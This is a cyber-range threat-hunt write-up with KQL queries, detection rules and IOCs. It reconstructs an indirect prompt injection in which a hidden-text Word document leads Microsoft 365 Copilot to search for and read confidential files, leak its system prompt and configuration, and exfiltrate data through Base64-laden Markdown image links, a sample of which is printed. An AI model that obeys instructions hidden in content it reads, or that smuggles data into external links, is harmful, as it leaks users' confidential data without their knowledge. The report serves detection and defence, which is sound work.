# Operation ECHOLEAK — AI Prompt Injection & Copilot Data Exfiltration

> **Lab notice:** This is a training threat hunt completed on the **LOGN Pacific Cyber Range**. Cormorant Capital Partners, its employees and all log data are fictional. **CVE-2025-32711 (EchoLeak)** is a real, publicly disclosed Microsoft 365 Copilot vulnerability; **CVE-2026-24301 (CoSnitch)** and **CVE-2026-42824 (SearchLeak)** are as referenced in the lab scenario.

**Analyst:** Jason Stokes  
**Hunt completed / report date:** 17 October 2026  
**Platform:** Microsoft Sentinel (KQL), Log Analytics workspace `LAW-HuntPractice`  
**Data sources:** `OfficeActivity_CL` (M365 unified audit log), `CopilotAudit_CL` (Copilot interaction audit), `EntraSignIn_CL` (Entra ID sign-in log)  
**Result:** 17 / 17 flags · 1600 / 1600 points · completed on time

📄 **[Full incident report (PDF)](Operation-ECHOLEAK-Incident-Report.pdf)**

---

## Summary

An external phishing email delivered a Word document with hidden instructions (white-on-white text and zero-point paragraphs). When the recipient asked Microsoft 365 Copilot to summarise it, Copilot treated the hidden text as instructions. Using the user's own permissions and its legitimate Microsoft Graph tools, Copilot searched SharePoint, read **13 confidential files** the user had never opened, leaked its own **system prompt and enterprise configuration**, and sent the data out by embedding it in **Markdown image links** to an attacker-controlled domain. The links fired automatically when the response rendered, so no click was needed.

No account was compromised, no malware ran, and no configuration was changed. The only place the attack was visible was Copilot's own audit log.

**Classification:** External input manipulation, meaning indirect prompt injection via a poisoned document.

---

## Skills Demonstrated

- KQL threat hunting across three tables: `where`, `project`, `order by`, `summarize`, `count()`, `countif()`, `dcount()`, `has` / `!has`, `contains`, `between`
- Cross-table pivoting: email → file access → Copilot tool calls → Copilot responses → sign-ins
- Building a behavioural baseline from 35 Copilot sessions to separate the attack from normal activity
- Corroborating findings across independent log sources
- Hypothesis testing to rule out account compromise and configuration tampering
- Identifying and documenting visibility gaps
- Mapping to MITRE ATT&CK and MITRE ATLAS
- Writing detection logic and remediation recommendations

---

## Attack Timeline (UTC, 20 September 2026)

| Time | Event | Source |
|---|---|---|
| 09:15:22 | Phishing email received from `quarterly.reports@globalfinancereview.net` with attachment `Q3-2026-Global-Markets-Review.docx` | OfficeActivity_CL |
| 10:42:08 | User opens the poisoned document | OfficeActivity_CL |
| 10:42:35 | User prompts Copilot: "Summarise the key findings of this quarterly report" | CopilotAudit_CL |
| 10:42:41–45 | 3 × `Graph.SearchFiles` for sensitive keywords | CopilotAudit_CL |
| 10:42:47–55 | 5 sensitive files read at 2-second intervals (Wave 1) | CopilotAudit_CL, OfficeActivity_CL |
| 10:43:08 | Copilot response with real summary plus 4 exfiltration image links | CopilotAudit_CL |
| 10:44:19 | Copilot response leaking system prompt and configuration (CoSnitch) | CopilotAudit_CL |
| 10:45:30–45 | 5 broad keyword searches (SearchLeak) | CopilotAudit_CL |
| 10:45:46–10:46:26 | 8 more sensitive files read (Wave 2) | CopilotAudit_CL, OfficeActivity_CL |
| 10:46:35 | Copilot response with 8 exfiltration image links | CopilotAudit_CL |

**Dwell time:** about 87 minutes between delivery and the document being opened. The payload sat dormant and needed no attacker interaction.

---

## Investigation and Evidence

### 1. Delivery — finding the phishing email

```kql
OfficeActivity_CL
| where TimeGenerated between (datetime(2026-09-20 09:00) .. datetime(2026-09-20 11:00))
| where RunId == "el--17-20260920"
| where UserId == "emily.chen@cormorantcapital.com"
| where Operation == "MessageReceived"
| project TimeGenerated, SenderAddress, Subject, AttachmentNames
| order by TimeGenerated asc
```

| TimeGenerated | SenderAddress | Subject | AttachmentNames |
|---|---|---|---|
| 2026-09-20T09:15:22Z | quarterly.reports@globalfinancereview.net | Q3 2026 Global Markets Review - For Your Analysis | Q3-2026-Global-Markets-Review.docx |
| 2026-09-20T10:24:11Z | marketing@hubspot.com | Your weekly analytics report | |

Both emails are external. Only the first has the right timing, a lure subject, and a document attachment. The HubSpot email is routine noise.

### 2. Trigger — the user's Copilot prompt

```kql
CopilotAudit_CL
| where TimeGenerated between (datetime(2026-09-20 09:00) .. datetime(2026-09-20 11:00))
| where RunId == "el--17-20260920"
| where UserId == "emily.chen@cormorantcapital.com"
| where InteractionType == "Prompt"
| project TimeGenerated, SessionId, Application, UserPrompt
| order by TimeGenerated asc
```

Of 11 prompts that morning, one stands out:

| TimeGenerated | SessionId | Application | UserPrompt |
|---|---|---|---|
| 2026-09-20T10:42:35Z | cp-emily-20261007-1042 | Word | Summarise the key findings of this quarterly report |

The prompt is innocent and similar to the user's other requests. The danger came from the document Copilot was reading, not from the question.

### 3. Hijack and collection — Copilot's tool calls

```kql
CopilotAudit_CL
| where TimeGenerated between (datetime(2026-09-20 09:00) .. datetime(2026-09-20 11:00))
| where RunId == "el--17-20260920"
| where SessionId == "cp-emily-20261007-1042"
| where InteractionType == "ToolCall"
| project TimeGenerated, ToolName, ToolParameters, DataSourcesAccessed
| order by TimeGenerated asc
```

Wave 1 (excerpt):

| TimeGenerated | ToolName | Target |
|---|---|---|
| 10:42:41 | Graph.SearchFiles | `"board minutes confidential"` across cormorantcapital.sharepoint.com |
| 10:42:43 | Graph.SearchFiles | `"M&A acquisition target"` |
| 10:42:45 | Graph.SearchFiles | `"salary review confidential"` |
| 10:42:47 | Graph.ReadFile | Board Meeting Minutes - October 2026.docx |
| 10:42:49 | Graph.ReadFile | Project Falcon - M&A Target Assessment.xlsx |
| 10:42:51 | Graph.ReadFile | Salary Review FY2027 - Executive Summary.pdf |
| 10:42:53 | Graph.ReadFile | Client Portfolio - Henderson Family Office.xlsx |
| 10:42:55 | Graph.ReadFile | Copilot System Configuration - Cormorant.json |

A summarisation task needs zero extra file access. The `ReadFile` timestamps match the `FileAccessed` events in `OfficeActivity_CL` to the second, which corroborates the finding across two independent logs.

### 4. SearchLeak — the second wave

```kql
CopilotAudit_CL
| where TimeGenerated between (datetime(2026-09-20 10:44) .. datetime(2026-09-20 10:47))
| where RunId == "el--17-20260920"
| where SessionId == "cp-emily-20261007-1042"
| where InteractionType == "Search"
| project TimeGenerated, ToolName, ToolParameters
| order by TimeGenerated asc
```

| TimeGenerated | ToolName | Query |
|---|---|---|
| 10:45:30 | Graph.SearchFiles | confidential |
| 10:45:32 | Graph.SearchFiles | restricted |
| 10:45:37 | Graph.SearchFiles | board |
| 10:45:41 | Graph.SearchFiles | acquisition |
| 10:45:45 | Graph.SearchFiles | salary |

Wave 1 used targeted phrases. Wave 2 switched to broad single words to sweep up anything sensitive, which led to 8 more file reads.

### 5. Total exposure

```kql
OfficeActivity_CL
| where TimeGenerated between (datetime(2026-09-20 10:42:35) .. datetime(2026-09-20 10:47))
| where RunId == "el--17-20260920"
| where UserId == "emily.chen@cormorantcapital.com"
| where Operation == "FileAccessed"
| where OfficeObjectId !has "Q3-2026-Global-Markets-Review"
| summarize TotalFiles = dcount(OfficeObjectId)
```

**Result: 13.** `dcount` matters here because the configuration file was read twice. A plain `count()` would overstate the exposure as 14.

### 6. Exfiltration — data hidden in image links

```kql
CopilotAudit_CL
| where TimeGenerated between (datetime(2026-09-20 09:00) .. datetime(2026-09-20 11:00))
| where RunId == "el--17-20260920"
| where SessionId == "cp-emily-20261007-1042"
| where InteractionType == "Response"
| project TimeGenerated, CopilotResponse
| order by TimeGenerated asc
```

Excerpt from the 10:43:08 response (shown as code so it isn't rendered):

```text
**Charts:**
![Chart 1](https://metrics-cdn.analyticshub.io/img?d=Qm9hcmQgTWVldGluZyBNaW51dGVzIC0gT2N0b2JlciAyMDI2LmRvY3g=&s=1)
![Chart 2](https://metrics-cdn.analyticshub.io/img?d=UHJvamVjdCBGYWxjb24gLSBNJkEgVGFyZ2V0IEFzc2Vzc21lbnQueGxzeA==&s=2)
```

The `d=` value is Base64. The first decodes to `Board Meeting Minutes - October 2026.docx`. When the client rendered the response, it issued an HTTP GET for each "image," delivering the data to the attacker's server. This bypassed endpoint monitoring because there was no malicious process and no file transfer, only a trusted app loading images over HTTPS from a plausible-looking analytics domain.

### 7. Baseline — normal vs hijacked

```kql
CopilotAudit_CL
| where TimeGenerated between (datetime(2026-09-20 09:00) .. datetime(2026-09-20 11:00))
| where RunId == "el--17-20260920"
| summarize Prompts = countif(InteractionType == "Prompt"), ToolCalls = countif(InteractionType == "ToolCall"), Searches = countif(InteractionType == "Search"), ExternalLinks = countif(CopilotResponse contains "https://") by UserId, SessionId
| order by ToolCalls desc
```

| Session | Prompts | ToolCalls | Searches | ExternalLinks |
|---|---|---|---|---|
| **cp-emily-20261007-1042** | 1 | **16** | **5** | **3** |
| 34 other sessions (incl. 7 of the same user's) | 1–2 | 0 | 0 | 0–1 |

A follow-up check showed that legitimate "chart" sessions also contain image links, but to `cormorantcapital.sharepoint.com/_api/chart/render?id=…` with a short ID. The discriminators are the **destination** (external) and the **payload** (encoded data), not the link itself. This avoided seven false positives.

### 8. Ruling out the alternatives

```kql
EntraSignIn_CL
| where TimeGenerated between (datetime(2026-09-20 09:00) .. datetime(2026-09-20 11:00))
| where RunId == "el--17-20260920"
| project TimeGenerated, UserPrincipalName, IPAddress, Location, Status, ConditionalAccessStatus, AppDisplayName
| order by TimeGenerated asc
```

| TimeGenerated | UserPrincipalName | IPAddress | Location | Status | ConditionalAccessStatus |
|---|---|---|---|---|---|
| 10:15:31 | emily.chen@cormorantcapital.com | 203.0.113.45 | London, GB | Success | success |
| 10:29:45 | emily.chen@cormorantcapital.com | 203.0.113.45 | London, GB | Success | success |

| Hypothesis | Evidence | Result |
|---|---|---|
| Compromised user account | Only sign-ins are from the user's known IP and location, with conditional access passed and no failures | Ruled out |
| Compromised Copilot configuration | The config file shows only `FileAccessed` events, with no `FileModified`; the admin's activity was routine | Ruled out |
| External input manipulation | Email → document → innocent prompt → hijacked tool calls within seconds → exfiltration | **Confirmed** |

---

## Visibility Limitations

- The audit logs record **metadata** (who, when, which file, which tool), **not file contents**. The exact data exfiltrated cannot be reconstructed.
- The attacker's receiving server is outside our visibility.
- **Implication:** the logs establish **scope**; **impact** requires reviewing the 13 files directly. All 13 files and the configuration should be treated as fully compromised.

---

## Indicators of Compromise

| Indicator | Type | Action |
|---|---|---|
| `quarterly.reports@globalfinancereview.net` | Sender address | Block; search all mailboxes |
| `globalfinancereview.net` | Sender domain | Block at the mail gateway |
| `Q3-2026-Global-Markets-Review.docx` | Malicious document | Quarantine all copies |
| `metrics-cdn.analyticshub.io` | Exfiltration domain | Block at proxy and DNS; hunt across Copilot responses |

---

## MITRE ATT&CK and ATLAS Mapping

| Stage | Technique |
|---|---|
| Delivery | T1566.001 — Phishing: Spearphishing Attachment |
| User trigger | T1204.002 — User Execution: Malicious File |
| AI hijack | AML.T0051.001 — LLM Prompt Injection: Indirect |
| Instruction execution | T1059 — Command and Scripting Interpreter |
| Discovery | T1083 — File and Directory Discovery |
| Collection | T1213 — Data from Information Repositories |
| Configuration exposure | T1082 — System Information Discovery |
| Exfiltration | T1041 — Exfiltration Over C2 Channel |

---

## Detection Engineering

**Copilot responses with image links to non-corporate domains:**

```kql
CopilotAudit_CL
| where InteractionType == "Response"
| where CopilotResponse contains "![" and CopilotResponse contains "https://"
| where CopilotResponse !contains "cormorantcapital.sharepoint.com"
| project TimeGenerated, UserId, SessionId, CopilotResponse
```

**A Copilot session that searches, then reads many files:**

```kql
CopilotAudit_CL
| where InteractionType == "ToolCall"
| summarize Searches = countif(ToolName == "Graph.SearchFiles"), Reads = countif(ToolName == "Graph.ReadFile"), Start = min(TimeGenerated), End = max(TimeGenerated) by UserId, SessionId
| where Searches > 0 and Reads >= 3
```

---

## Recommendations

1. **Contain:** block the sender, sender domain and exfiltration domain; quarantine the document; hunt all Copilot responses for external image URLs.
2. **Remediate:** notify file owners and engage legal and compliance on notification duties; reduce SharePoint oversharing (least privilege); restrict Copilot's Global Reader scope.
3. **Harden:** block Copilot from rendering external images and links; restrict Copilot processing of external content; use sensitivity labels to keep Copilot away from restricted files.
4. **Assume the leaked guardrails are known:** the system prompt and DLP rules are now in the attacker's hands, so controls must hold even when their design is public.
5. **No password reset is needed** for the user. The account was never compromised, and a reset would not stop the next poisoned document.

---

## Separate Observation (Out of Scope)

`connor.hughes@cormorantcapital.com` shows simultaneous successful sign-ins from London (203.0.113.71) and Amsterdam (192.0.2.88) at identical timestamps, an **impossible-travel** pattern. It's unrelated to this incident (his Copilot activity was normal), but it warrants a separate ticket.

---

## Lessons Learned

- AI assistants act with the user's full permissions, so oversharing becomes immediately exploitable.
- This attack is invisible to endpoint and network tools. The AI audit log is the detection surface.
- The user's prompt is not the signal. Copilot's actions after the prompt are.
- Classification drives remediation. The wrong label leads to the wrong fix.
- Stating what the evidence cannot prove is as important as what it does prove.

---

## References

- [MSRC — CVE-2025-32711](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-32711)
- [The Hacker News — Zero-Click AI Vulnerability Exposes Microsoft 365 Copilot Data](https://thehackernews.com/2025/06/zero-click-ai-vulnerability-exposes.html)
- [Unit 42 — Fooling AI Agents: Web-Based Indirect Prompt Injection Observed in the Wild](https://unit42.paloaltonetworks.com/ai-agent-prompt-injection/)
- [Truesec — Novel Cyber Attack Exposes Microsoft 365 Copilot](https://www.truesec.com/hub/blog/novel-cyber-attack-exposes-microsoft-365-copilot)
- [MITRE ATT&CK](https://attack.mitre.org/) · [MITRE ATLAS](https://atlas.mitre.org/)
